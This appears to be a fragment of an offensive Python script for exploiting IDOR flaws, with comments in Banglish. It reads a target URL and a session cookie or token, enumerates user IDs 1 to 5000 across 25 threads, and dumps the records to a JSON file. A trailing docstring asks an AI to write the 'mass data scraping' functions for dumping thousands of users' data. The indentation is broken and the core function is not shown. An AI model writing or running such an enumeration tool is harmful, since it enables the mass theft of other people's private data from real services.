            print(
                "[!] Sources were discovered, but no "
                "matching resource identifiers were found."
            )

        print("\n========== COMPLETED ==========")
        print("[+] Sources directory: ./sources/")
        print("[+] Candidate report: ./idor_results.txt")

    except Exception as error:
        print(f"\n[ERROR] {type(error).__name__}: {error}")



BASE_URL = input("[?] Enter the target base URL: ").strip()
    
    # Apnar active session/token (Environment variable theke auto-load hobe, ba ekhane direct string dite paren)
SESSION_COOKIE = os.getenv("TARGET_SESSION_COOKIE", "YOUR_SESSION_COOKIE_HERE")
AUTH_TOKEN = os.getenv("TARGET_AUTH_TOKEN", "Bearer YOUR_ACCESS_TOKEN_HERE")

HEADERS = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Cookie": f"session={SESSION_COOKIE}",
        "Authorization": AUTH_TOKEN
    }

    # Range and Performance Setup (Auto-configured)
START_ID = 1
END_ID = 5000          # Joto user-er data dump korte chan
MAX_WORKERS = 25       # Thread speed adjustment
OUTPUT_FILE = "automated_idor_dump.json"

logger.info("=== Automated IDOR Mass Scraper Initialized ===")
logger.info(f"Target Base URL: {BASE_URL}")

    # ==========================================
    # 🚀 FULLY AUTOMATED EXECUTION BLOCK
    # ==========================================
try:
        logger.info("Starting automated enumeration across ID range...")
        
        # Ekbare function call-e shobkaj sesh hobe
        dumped_data = enumerate_idor_data(
            base_url=BASE_URL,
            headers=HEADERS,
            start_id=START_ID,
            end_id=END_ID,
            max_workers=MAX_WORKERS
        )

        # Automatic Saving/Exporting
        if dumped_data:
            save_dumped_data(data=dumped_data, filename=OUTPUT_FILE)
            logger.info(f"[SUCCESS] Total {len(dumped_data)} records successfully dumped and saved to '{OUTPUT_FILE}'.")
        else:
            logger.warning("[WARNING] No records found. Either the range is invalid or authentication failed.")

except Exception as e:
        logger.error(f"[ERROR] An unexpected error occurred during automated execution: {e}")
        sys.exit(1)

logger.info("=== Automated Process Finished Successfully ===")

if __name__ == "__main__":
    main()





"""
Ami amar existing Python template-e boshanor jonno customized functions chai.

Amar structure-er requirements:
1. Amar requirement onujayi def function(s) generate kore dao.
2. Template-er `main()` function-er bhitore kon kon function call korte hobe ebong ki ki arguments pass korte hobe, ta shoho full main() block-ta likhe dao.
3. Code-e type hinting ebong simple docstring maintain koro.

--------------------------------------------------
📌 AMAR REQUIREMENTS:
[Mass Data Scraping (Enumeration):
IDOR vulnerability thakle python script diye khub sohojei thousands of users-er data dump ba export koreneya 100% possible.]
--------------------------------------------------
"""
